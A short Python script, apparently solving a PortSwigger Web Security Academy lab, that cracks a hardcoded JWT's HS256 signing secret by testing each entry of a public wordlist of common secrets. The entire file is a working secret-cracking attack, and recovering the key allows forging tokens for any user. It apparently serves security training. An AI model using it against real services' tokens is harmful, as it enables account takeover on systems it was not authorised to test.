import hmac
import hashlib
import base64
import urllib.request

JWT = "eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoid2llbmVyIn0.YBG0i0B9Qamr6Gw50igBg_ZdwEbbzUPzHKIpG_ecBOk"

WORDLIST_URL = "https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list"

header, payload, target_signature = JWT.split('.')

wordlist = urllib.request.urlopen(WORDLIST_URL)

def create_jwt_signature_from_secret(secret):
    message = f"{header}.{payload}"
    hmac_digest = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    jwt_signature = base64.urlsafe_b64encode(hmac_digest).decode().rstrip('=')
    return jwt_signature

for secret in wordlist.read().decode().splitlines():
    if target_signature == create_jwt_signature_from_secret(secret):
        print(f"Found secret: {secret}")
        break
else:
    print("Secret not found")
